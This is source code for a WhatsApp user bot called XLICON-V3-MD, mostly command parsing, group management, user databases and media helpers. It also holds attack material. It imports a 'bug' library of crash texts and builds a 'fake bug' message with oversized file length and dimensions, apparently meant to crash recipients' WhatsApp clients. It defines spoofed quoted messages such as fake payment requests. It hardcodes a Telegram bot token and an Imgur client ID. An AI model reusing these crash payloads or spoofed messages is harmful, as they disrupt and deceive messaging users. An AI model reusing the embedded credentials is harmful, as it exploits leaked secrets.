//══════════════════════════════════════════════════════════════════════════════════════════════════════//
//                                                                                                      //
//                                 𝐗𝐋𝐈𝐂𝐎𝐍-𝐕𝟑-𝐌𝐃    𝐁𝐎𝐓                                                //
//                                                                                                      //
//                                         Ｖ：3.0                                                      //
//                                                                                                      //
//              ██╗  ██╗██╗     ██╗ ██████╗ ██████╗ ███╗   ██╗      ██╗   ██╗██████╗                    //
//              ╚██╗██╔╝██║     ██║██╔════╝██╔═══██╗████╗  ██║      ██║   ██║╚════██╗                   //
//                ╚███╔╝ ██║     ██║██║     ██║   ██║██╔██╗ ██║█████╗██║   ██║ █████╔╝                  //
//               ██╔██╗ ██║     ██║██║     ██║   ██║██║╚██╗██║╚════╝╚██╗ ██╔╝ ╚═══██╗                   //
//              ██╔╝ ██╗███████╗██║╚██████╗╚██████╔╝██║ ╚████║       ╚████╔╝ ██████╔╝                   //
//              ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝        ╚═══╝  ╚═════╝                    //
//                                                                                                      //
//                                                                                                      //
//                                                                                                      //
//══════════════════════════════════════════════════════════════════════════════════════════════════════//
//*
//  * @project_name : XLICON-V3-MD
//  * @author : salmanytofficial
//  * @youtube : https://www.youtube.com/@s4salmanyt
//   * @description : XLICON-V3 ,A Multi-functional whatsapp user bot.
//*
//*
//base by DGXeon
//re-upload? recode? copy code? give credit ya :)
//Instagram: unicorn_xeon13
//Telegram: t.me/ahmmitech
//GitHub: @salmanytofficial
//WhatsApp: +923184070915
//want more free bot scripts? subscribe to my youtube channel: https://youtube.com/@DGXeon
//   * Created By Github: DGXeon.
//   * Credit To Xeon
//   * © 2024 XLICON-V3-MD.
// ⛥┌┤
// */

require("./lib/listmenu");
const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType,
} = require("@whiskeysockets/baileys");
const os = require("os");
const fs = require("fs");
const fsx = require("fs-extra");
const path = require("path");
const util = require("util");
const { color } = require("./lib/color");
const chalk = require("chalk");
const moment = require("moment-timezone");
const cron = require("node-cron");
const speed = require("performance-now");
const ms = (toMs = require("ms"));
const axios = require("axios");
const fetch = require("node-fetch");
const yts = require("yt-search");
const gis = require("g-i-s");
const cheerio = require("cheerio");
const { randomBytes } = require("crypto");
const fg = require("api-dylux");
const googleTTS = require("google-tts-api");
const jsobfus = require("javascript-obfuscator");
const { translate } = require("@vitalets/google-translate-api");
const scp2 = require("./lib/scraper2");
const pkg = require("imgur");
const { ImgurClient } = pkg;
const client = new ImgurClient({ clientId: "a0113354926015a" });
const { exec, spawn, execSync } = require("child_process");
const { performance } = require("perf_hooks");
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const {
  TelegraPh,
  UploadFileUgu,
  webp2mp4File,
  floNime,
} = require("./lib/uploader");
const {
  toAudio,
  toPTT,
  toVideo,
  ffmpeg,
  addExifAvatar,
} = require("./lib/converter");
const {
  smsg,
  getGroupAdmins,
  formatp,
  formatDate,
  getTime,
  isUrl,
  await,
  sleep,
  clockString,
  msToDate,
  sort,
  toNumber,
  enumGetKey,
  runtime,
  fetchJson,
  getBuffer,
  json,
  delay,
  format,
  logic,
  generateProfilePicture,
  parseMention,
  getRandom,
  pickRandom,
  fetchBuffer,
  buffergif,
  totalcase,
} = require("./lib/myfunc");
//prem owner function
const {
  addPremiumUser,
  getPremiumExpired,
  getPremiumPosition,
  expiredPremiumCheck,
  checkPremiumUser,
  getAllPremiumUser,
} = require("./lib/premiun");
//data
let ntnsfw = JSON.parse(fs.readFileSync("./src/data/function/nsfw.json"));
let bad = JSON.parse(fs.readFileSync("./src/data/function/badword.json"));
let premium = JSON.parse(fs.readFileSync("./src/data/role/premium.json"));
const owner = JSON.parse(fs.readFileSync("./src/data/role/owner.json"));
//media
const VoiceNoteXeon = JSON.parse(
  fs.readFileSync("./XliconMedia/database/Xliconvn.json")
);
const StickerXeon = JSON.parse(
  fs.readFileSync("./XliconMedia/database/Xliconsticker.json")
);
const ImageXeon = JSON.parse(
  fs.readFileSync("./XliconMedia/database/Xliconimage.json")
);
const VideoXeon = JSON.parse(
  fs.readFileSync("./XliconMedia/database/Xliconvideo.json")
);
const DocXeon = JSON.parse(fs.readFileSync("./XliconMedia/database/doc.json"));
const ZipXeon = JSON.parse(fs.readFileSync("./XliconMedia/database/zip.json"));
const ApkXeon = JSON.parse(fs.readFileSync("./XliconMedia/database/apk.json"));

//bug database
const { xeontext1 } = require("./src/data/function/XBug/Xlicontext1");
const { xeontext2 } = require("./src/data/function/XBug/Xlicontext2");
const { xeontext3 } = require("./src/data/function/XBug/Xlicontext3");
const { xeontext4 } = require("./src/data/function/XBug/Xlicontext4");
const { xeontext5 } = require("./src/data/function/XBug/Xlicontext5");

const xeonverifieduser = JSON.parse(
  fs.readFileSync("./src/data/role/user.json")
);

global.db.data = JSON.parse(fs.readFileSync("./src/database.json"));
if (global.db.data)
  global.db.data = {
    sticker: {},
    database: {},
    game: {},
    others: {},
    users: {},
    chats: {},
    settings: {},
    ...(global.db.data || {}),
  };

let vote = (db.data.others.vote = []);
let kuismath = (db.data.game.math = []);
//afk function
function formatAfkDuration(ms) {
  let seconds = Math.floor(ms / 1000);
  let minutes = Math.floor(seconds / 60);
  let hours = Math.floor(minutes / 60);
  let days = Math.floor(hours / 24);

  seconds %= 60;
  minutes %= 60;
  hours %= 24;

  let parts = [];
  if (days) parts.push(days + " days");
  if (hours) parts.push(hours + " hours");
  if (minutes) parts.push(minutes + " minutes");
  if (seconds) parts.push(seconds + " seconds");

  return parts.join(", ");
}
//time
const xtime = moment.tz("Asia/Karachi").format("HH:mm:ss");
const xdate = moment.tz("Asia/Karachi").format("DD/MM/YYYY");
const time2 = moment().tz("Asia/Karachi").format("HH:mm:ss");
if (time2 < "23:59:00") {
  var xeonytimewisher = `Good Night 🌌`;
}
if (time2 < "19:00:00") {
  var xeonytimewisher = `Good Evening 🌃`;
}
if (time2 < "18:00:00") {
  var xeonytimewisher = `Good Evening 🌃`;
}
if (time2 < "15:00:00") {
  var xeonytimewisher = `Good Afternoon 🌅`;
}
if (time2 < "11:00:00") {
  var xeonytimewisher = `Good Morning 🌄`;
}
if (time2 < "05:00:00") {
  var xeonytimewisher = `Good Morning 🌄`;
}
//function
const reSize = async (buffer, ukur1, ukur2) => {
  return new Promise(async (resolve, reject) => {
    let jimp = require("jimp");
    var baper = await jimp.read(buffer);
    var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG);
    resolve(ab);
  });
};
//module
module.exports = XliconBotInc = async (XliconBotInc, m, chatUpdate, store) => {
  try {
    const { type, quotedMsg, mentioned, now, fromMe } = m;
    var body =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype == "imageMessage"
        ? m.message.imageMessage.caption
        : m.mtype == "videoMessage"
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage"
        ? m.message.extendedTextMessage.text
        : m.mtype == "buttonsResponseMessage"
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype == "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype == "templateButtonReplyMessage"
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype === "messageContextInfo"
        ? m.message.buttonsResponseMessage?.selectedButtonId ||
          m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
          m.text
        : "";
    var budy = typeof m.text == "string" ? m.text : "";
    //prefix 1
    var prefix = [".", "/"]
      ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body)
        ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0]
        : ""
      : xprefix;
    const isCmd = body.startsWith(prefix, "");
    const isCmd2 = body.startsWith(prefix);
    const command = body
      .replace(prefix, "")
      .trim()
      .split(/ +/)
      .shift()
      .toLowerCase();
    const command2 = body.slice(1).trim().split(/ +/).shift().toLowerCase();
    const args = body.trim().split(/ +/).slice(1);
    const full_args = body.replace(command, "").slice(1).trim();
    const pushname = m.pushName || "No Name";
    const botNumber = await XliconBotInc.decodeJid(XliconBotInc.user.id);
    const itsMe = m.sender == botNumber ? true : false;
    const sender = m.sender;
    const text = (q = args.join(" "));
    const from = m.key.remoteJid;
    const fatkuns = m.quoted || m;
    const quoted =
      fatkuns.mtype == "buttonsMessage"
        ? fatkuns[Object.keys(fatkuns)[1]]
        : fatkuns.mtype == "templateMessage"
        ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]]
        : fatkuns.mtype == "product"
        ? fatkuns[Object.keys(fatkuns)[0]]
        : m.quoted
        ? m.quoted
        : m;
    const mime = (quoted.msg || quoted).mimetype || "";
    const qmsg = quoted.msg || quoted;
    //media
    const isMedia = /image|video|sticker|audio/.test(mime);
    const isImage = type == "imageMessage";
    const isVideo = type == "videoMessage";
    const isAudio = type == "audioMessage";
    const isDocument = type == "documentMessage";
    const isLocation = type == "locationMessage";
    const isContact = type == "contactMessage";
    const isSticker = type == "stickerMessage";
    const isText = type == "textMessage";
    const isQuotedText =
      type === "extendexTextMessage" && content.includes("textMessage");
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedLocation =
      type === "extendedTextMessage" && content.includes("locationMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedContact =
      type === "extendedTextMessage" && content.includes("contactMessage");
    const isQuotedDocument =
      type === "extendedTextMessage" && content.includes("documentMessage");
    //prefix 2
    const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : xprefix;
    const xeonybody = body.startsWith(pric);
    const isCommand = xeonybody
      ? body.replace(pric, "").trim().split(/ +/).shift().toLowerCase()
      : "";
    const sticker = [];
    //group
    const isGroup = m.key.remoteJid.endsWith("@g.us");
    const groupMetadata = m.isGroup
      ? await XliconBotInc.groupMetadata(m.chat).catch((e) => {})
      : "";
    const groupName = m.isGroup ? groupMetadata.subject : "";
    const participants = m.isGroup ? await groupMetadata.participants : "";
    const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : "";
    const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const groupOwner = m.isGroup ? groupMetadata.owner : "";
    const isGroupOwner = m.isGroup
      ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender)
      : false;
    const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false;
    const mentionByReply =
      type == "extendedTextMessage" &&
      m.message.extendedTextMessage.contextInfo != null
        ? m.message.extendedTextMessage.contextInfo.participant || ""
        : "";
    const mentionByTag =
      type == "extendedTextMessage" &&
      m.message.extendedTextMessage.contextInfo != null
        ? m.message.extendedTextMessage.contextInfo.mentionedJid
        : [];
    //anti media
    const isXliconMedia = m.mtype;
    //user status
    const isUser = xeonverifieduser.includes(sender);
    const XeonTheCreator = [botNumber, ...owner]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(m.sender);
    const isPremium = XeonTheCreator || checkPremiumUser(m.sender, premium);
    expiredPremiumCheck(XliconBotInc, m, premium);

    //theme sticker reply
    const XliconStickWait = () => {
      let XeonStikRep = fs.readFileSync(
        "./XliconMedia/theme/sticker_reply/wait.webp"
      );
      XliconBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m });
    };
    const XliconStickAdmin = () => {
      let XeonStikRep = fs.readFileSync(
        "./XliconMedia/theme/sticker_reply/admin.webp"
      );
      XliconBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m });
    };
    const XliconStickBotAdmin = () => {
      let XeonStikRep = fs.readFileSync(
        "./XliconMedia/theme/sticker_reply/botadmin.webp"
      );
      XliconBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m });
    };
    const XliconStickOwner = () => {
      let XeonStikRep = fs.readFileSync(
        "./XliconMedia/theme/sticker_reply/owner.webp"
      );
      XliconBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m });
    };
    const XeonStickGroup = () => {
      let XeonStikRep = fs.readFileSync(
        "./XliconMedia/theme/sticker_reply/group.webp"
      );
      XliconBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m });
    };
    const XliconStickPrivate = () => {
      let XeonStikRep = fs.readFileSync(
        "./XliconMedia/theme/sticker_reply/private.webp"
      );
      XliconBotInc.sendMessage(from, { sticker: XeonStikRep }, { quoted: m });
    };
    //premium
    async function replyprem(teks) {
      replygcXlicon(
        `This feature is for premium user, contact the owner to become premium user`
      );
    }
    //script replier
    async function sendXliconBotIncMessage(chatId, message, options = {}) {
      let generate = await generateWAMessage(chatId, message, options);
      let type2 = getContentType(generate.message);
      if ("contextInfo" in options)
        generate.message[type2].contextInfo = options?.contextInfo;
      if ("contextInfo" in message)
        generate.message[type2].contextInfo = message?.contextInfo;
      return await XliconBotInc.relayMessage(chatId, generate.message, {
        messageId: generate.key.id,
      });
    }
    //reply
    async function replygcXlicon(teks) {
      if (typereply === "v1") {
        m.reply(teks);
      } else if (typereply === "v2") {
        XliconBotInc.sendMessage(
          m.chat,
          {
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: botname,
                body: ownername,
                previewType: "PHOTO",
                thumbnail: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                sourceUrl: wagc,
              },
            },
            text: teks,
          },
          {
            quoted: m,
          }
        );
      } else if (typereply === "v3") {
        XliconBotInc.sendMessage(
          m.chat,
          {
            text: teks,
            contextInfo: {
              externalAdReply: {
                showAdAttribution: true,
                title: botname,
                body: ownername,
                thumbnail: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
                sourceUrl: websitex,
                mediaType: 1,
                renderLargerThumbnail: true,
              },
            },
          },
          { quoted: m }
        );
      }
    }

    //fake bug
    const fbug2 = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "status@broadcast" },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: `${xeontext1}`,
          caption: `${xeontext1}`,
          jpegThumbnail: thumb,
        },
      },
    };
    let fbug = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
          mimetype: "image/jpeg",
          caption: `${xeontext3}`,
          fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
          fileLength: "999999999",
          height: 999999999,
          width: 999999999,
          mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
          fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
          directPath:
            "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
          mediaKeyTimestamp: "1610993486",
          jpegThumbnail: await reSize(thumb, 100, 100),
          scansSidecar:
            "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
        },
      },
    };
    //end fbug

    let fstatus = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
          mimetype: "image/jpeg",
          caption: botname,
          fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
          fileLength: "28777",
          height: 1080,
          width: 1079,
          mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
          fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
          directPath:
            "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
          mediaKeyTimestamp: "1610993486",
          jpegThumbnail: await reSize(thumb, 100, 100),
          scansSidecar:
            "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
        },
      },
    };

    //Fake quoted
    const fpay = {
      key: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: global.botname,
        participant: "0@s.whatsapp.net",
      },
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          amount1000: 999999999,
          requestFrom: "0@s.whatsapp.net",
          noteMessage: { extendedTextMessage: { text: global.botname } },
          expiryTimestamp: 999999999,
          amount: { value: 91929291929, offset: 1000, currencyCode: "USD" },
        },
      },
    };
    const ftroli = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
      },
      message: {
        orderMessage: {
          itemCount: 2022,
          status: 200,
          thumbnail: thumb,
          surface: 200,
          message: botname,
          orderTitle: ownername,
          sellerJid: "0@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
    const fdoc = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
      },
      message: { documentMessage: { title: botname, jpegThumbnail: thumb } },
    };
    const fvn = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 359996400,
          ptt: "true",
        },
      },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        videoMessage: {
          title: botname,
          h: wm,
          seconds: "359996400",
          gifPlayback: "true",
          caption: ownername,
          jpegThumbnail: thumb,
        },
      },
    };
    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: wm,
          caption: `${pushname}`,
          jpegThumbnail: thumb,
        },
      },
    };
    const fvideo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        videoMessage: {
          title: botname,
          h: wm,
          seconds: "359996400",
          caption: `${pushname}`,
          jpegThumbnail: thumb,
        },
      },
    };
    const floc = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
      },
      message: { locationMessage: { name: wm, jpegThumbnail: thumb } },
    };
    const fkontak = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
      },
      message: {
        contactMessage: {
          displayName: ownername,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`,
          jpegThumbnail: thumb,
          thumbnail: thumb,
          sendEphemeral: true,
        },
      },
    };
    const fakestatus = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
          mimetype: "image/jpeg",
          caption: wm,
          fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
          fileLength: "28777",
          height: 1080,
          width: 1079,
          mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
          fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
          directPath:
            "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
          mediaKeyTimestamp: "1610993486",
          jpegThumbnail: fs.readFileSync("./XliconMedia/theme/xliconpic.jpg"),
          scansSidecar:
            "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
        },
      },
    };
    const frpayment = {
      key: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: `${ownername}`,
        participant: "0@s.whatsapp.net",
      },
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          amount1000: 999999999,
          requestFrom: "0@s.whatsapp.net",
          noteMessage: {
            extendedTextMessage: {
              text: `${botname}`,
            },
          },
          expiryTimestamp: 999999999,
          amount: {
            value: 91929291929,
            offset: 1000,
            currencyCode: "USD",
          },
        },
      },
    };

    const pickRandom = (arr) => {
      return arr[Math.floor(Math.random() * arr.length)];
    };

    //database
    try {
      let isNumber = (x) => typeof x === "number" && !isNaN(x);
      let limitUser = isPremium ? 1000 : 100;
      let user = global.db.data.users[sender];
      if (typeof user !== "object") global.db.data.users[sender] = {};
      if (user) {
        if (!isNumber(user.afkTime)) user.afkTime = -1;
        if (!("badword" in user)) user.badword = 0;
        if (!("title" in user)) user.title = "";
        if (!("serialNumber" in user))
          user.serialNumber = randomBytes(16).toString("hex");
        if (!("afkReason" in user)) user.afkReason = "";
        if (!("nick" in user)) user.nick = XliconBotInc.getName(sender);
        if (!isPremium) user.premium = false;
        if (!("totalLimit" in user)) user.totalLimit = 0;
        if (!isNumber(user.limit)) user.limit = limitUser;
      } else
        global.db.data.users[sender] = {
          serialNumber: randomBytes(16).toString("hex"),
          title: `${isPremium ? "Premium" : "User"}`,
          afkTime: -1,
          badword: 0,
          afkReason: "",
          nick: XliconBotInc.getName(sender),
          premium: `${isPremium ? "true" : "false"}`,
          limit: limitUser,
          totalLimit: 0,
        };

      let chats = global.db.data.chats[from];
      if (typeof chats !== "object") global.db.data.chats[from] = {};
      if (chats) {
        if (!("badword" in chats)) chats.badword = false;
        if (!("antiforeignnum" in chats)) chats.antiforeignnum = false;
        if (!("antibot" in chats)) chats.antibot = false;
        if (!("antiviewonce" in chats)) chats.antiviewonce = false;
        if (!("antimedia" in chats)) chats.media = false;
        if (!("antivirtex" in chats)) chats.antivirtex = false;
        if (!("antiimage" in chats)) chats.antiimage = false;
        if (!("antivideo" in chats)) chats.video = false;
        if (!("antiaudio" in chats)) chats.antiaudio = false;
        if (!("antipoll" in chats)) chats.antipoll = false;
        if (!("antisticker" in chats)) chats.antisticker = false;
        if (!("anticontact" in chats)) chats.anticontact = false;
        if (!("antilocation" in chats)) chats.antilocation = false;
        if (!("antidocument" in chats)) chats.antidocument = false;
        if (!("antilink" in chats)) chats.antilink = false;
        if (!("antilinkgc" in chats)) chats.antilinkgc = false;
      } else
        global.db.data.chats[from] = {
          badword: false,
          antiforeignnum: false,
          antibot: false,
          antiviewonce: false,
          antivirtex: false,
          antimedia: false,
          antiimage: false,
          antivideo: false,
          antiaudio: false,
          antipoll: false,
          antisticker: false,
          antilocation: false,
          antidocument: false,
          anticontact: false,
          antilink: false,
          antilinkgc: false,
        };

      let setting = global.db.data.settings[botNumber];
      if (typeof setting !== "object") global.db.data.settings[botNumber] = {};
      if (setting) {
        if (!("totalhit" in setting)) setting.totalhit = 0;
        if (!("totalError" in setting)) setting.totalError = 0;
        if (!("online" in setting)) setting.online = false;
        if (!("autosticker" in setting)) setting.autosticker = false;
        if (!("autobio" in setting)) setting.autobio = false;
        if (!("autoread" in setting)) setting.autoread = false;
        if (!("autorecordtype" in setting)) setting.autorecordtype = false;
        if (!("autorecord" in setting)) setting.autorecord = false;
        if (!("autotype" in setting)) setting.autotype = false;
        if (!("autoblocknum" in setting)) setting.autoblocknum = false;
        if (!("onlyindia" in setting)) setting.onlyindia = false;
        if (!("onlyindo" in setting)) setting.onlyindo = false;
        if (!("onlygrub" in setting)) setting.onlygrub = false;
        if (!("onlypc" in setting)) setting.onlypc = false;
        if (!("watermark" in setting)) setting.watermark = { packname, author };
        if (!("about" in setting))
          setting.about = {
            bot: { nick: XliconBotInc.getName(botNumber), alias: botname },
            owner: {
              nick: XliconBotInc.getName(
                global.ownernumber + "@s.whatsapp.net"
              ),
              alias: global.ownernumber,
            },
          };
      } else
        global.db.data.settings[botNumber] = {
          totalhit: 0,
          totalError: 0,
          online: false,
          autosticker: false,
          autobio: false,
          autoread: false,
          autoblocknum: false,
          onlyindia: false,
          onlyindo: false,
          onlygrub: false,
          onlypc: false,
          autorecordtype: false,
          autorecord: false,
          autotype: false,
          watermark: {
            packname: global.packname,
            author: global.author,
          },
          about: {
            bot: {
              nick: XliconBotInc.getName(botNumber),
              alias: botname,
            },
            owner: {
              nick: XliconBotInc.getName(
                global.ownernumber + "@s.whatsapp.net"
              ),
              alias: global.ownernumber,
            },
          },
        };
    } catch (err) {
      console.log(err);
    }

    //photo uploader
    async function uploadtoimgur(imagepath) {
      try {
        const response = await client.upload({
          image: fs.createReadStream(imagepath),
          type: "stream",
        });

        let url = response.data.link;
        console.log(url);
        return url;
      } catch (error) {
        console.error("Error uploading image to Imgur:", error);
        throw error;
      }
    }

    async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $("input[name=token]").val();
      let build_server = $("input[name=build_server]").val();
      let build_server_id = $("input[name=build_server_id]").val();
      form.append("text[]", text);
      form.append("token", token);
      form.append("build_server", build_server);
      form.append("build_server_id", build_server_id);
      let res = await axios({
        url: url,
        method: "POST",
        data: form,
        headers: {
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: gT.headers["set-cookie"]?.join("; "),
          "Content-Type": "multipart/form-data",
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$("input[name=form_value_input]").val());
      json["text[]"] = json.text;
      delete json.text;
      let { data } = await axios.post(
        "https://en.ephoto360.com/effect/create-image",
        new URLSearchParams(json),
        {
          headers: {
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            cookie: gT.headers["set-cookie"].join("; "),
          },
        }
      );
      return build_server + data.image;
    }

    //bug loading
    async function loading() {
      var xeonlod = [
        "```■■□□□□□□□ 10%```",
        "```■■■■□□□□□ 30%```",
        "```■■■■■■□□□ 50%```",
        "```■■■■■■■■□ 80%```",
        "```■■■■■■■■■ 100%```",
        "```C o m p l e t e...!```🐦",
      ];
      let { key } = await XliconBotInc.sendMessage(from, {
        text: "ʟᴏᴀᴅɪɴɢ...",
      });

      for (let i = 0; i < xeonlod.length; i++) {
        await XliconBotInc.sendMessage(from, { text: xeonlod[i], edit: key });
      }
    }

    async function obfus(query) {
      return new Promise((resolve, reject) => {
        try {
          const obfuscationResult = jsobfus.obfuscate(query, {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1,
          });
          const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode(),
          };
          resolve(result);
        } catch (e) {
          reject(e);
        }
      });
    }
    //random number
    function getRandomNumber(min, max) {
      min = Math.ceil(min);
      max = Math.floor(max);
      return Math.floor(Math.random() * (max - min + 1)) + min;
    }
    async function styletext(teks) {
      return new Promise((resolve, reject) => {
        axios
          .get("http://qaz.wtf/u/convert.cgi?text=" + teks)
          .then(({ data }) => {
            let $ = cheerio.load(data);
            let hasil = [];
            $("table > tbody > tr").each(function (a, b) {
              hasil.push({
                name: $(b).find("td:nth-child(1) > span").text(),
                result: $(b).find("td:nth-child(2)").text().trim(),
              });
            });
            resolve(hasil);
          });
      });
    }

    async function Telesticker(url) {
      return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi))
          return replygcXlicon("*_Enther your url telegram sticker link_*");
        packName = url.replace("https://t.me/addstickers/", "");
        data = await axios(
          `https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(
            packName
          )}`,
          { method: "GET", headers: { "User-Agent": "GoogleBot" } }
        );
        const xeonyresult = [];
        for (let i = 0; i < data.data.result.stickers.length; i++) {
          fileId = data.data.result.stickers[i].thumb.file_id;
          data2 = await axios(
            `https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`
          );
          result = {
            status: 200,
            author: "SalmanSer",
            url:
              "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" +
              data2.data.result.file_path,
          };
          xeonyresult.push(result);
        }
